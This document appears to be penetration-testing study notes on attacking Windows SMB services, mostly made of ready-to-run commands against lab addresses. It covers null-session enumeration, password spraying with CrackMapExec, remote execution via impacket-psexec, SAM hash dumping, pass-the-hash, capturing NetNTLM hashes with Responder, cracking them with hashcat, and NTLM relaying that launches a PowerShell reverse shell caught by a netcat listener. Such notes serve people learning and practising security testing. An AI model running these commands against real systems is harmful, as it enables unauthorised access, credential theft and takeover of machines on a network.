# Enumeration
```shell
sudo nmap 10.129.14.128 -sV -sC -p139,445
```
# Misconfigurations
- SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.
# Anonymous Authentication
- Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`.
## File Share
```shell
smbclient -N -L //10.129.14.128
```
## SMBmap
```shell
smbmap -H 10.129.14.128
```

Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:
```shell
smbmap -H 10.129.14.128 -r notes
```

```shell
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

```shell
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
## Remote Procedure Call (RPC)
```shell
rpcclient -U'%' 10.10.110.17
```
```rpc
enumdomusers
```
## Enum4linux
- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information
```shell
./enum4linux-ng.py 10.10.11.45 -A -C
```
# Protocol Specifics Attacks
- If a null session is not enabled, we will need credentials to interact with the SMB protocol. 
- Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).
## Brute Forcing and Password Spray
### CrackMapExec
```shell
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
# SMB
- When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. 
- If this user is an Administrator or has specific privileges, we will be able to perform operations such as:
	- Remote Command Execution
	- Extract Hashes from SAM Database
	- Enumerating Logged-on Users
	- Pass-the-Hash (PTH)
## Remote Code Execution (RCE)
### Impacket PsExec
```shell
impacket-psexec administrator:'Password123!'@10.10.110.17
```
### CrackMapExec
```shell
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
#### Enumerating Logged-on Users
```shell
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
#### Extract Hashes from SAM Database
```shell
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
#### Pass-the-Hash (PtH)
```shell
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
## Forced Authentication Attacks
- We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).
### Responder
```shell
responder -I <interface name>
```
```shell
sudo responder -I ens33
```
The captured credentials can be cracked using [hashcat](https://hashcat.net/hashcat/) or relayed to a remote host to complete the authentication and impersonate the user.
#### Hashcat
```shell
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)
#### Responder.conf
```shell-session
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```
#### impacket-ntlmrelayx
```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).
```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <hash>'
```
#### Netcat
```shell
nc -lvnp 9001
```
## RPC
- We can use RPC to make changes to the system, such as:
	- Change a user's password.
	- Create a new domain user.
	- Create a new shared folder.
We can use the [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) or [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) from the SANS Institute to explore this further.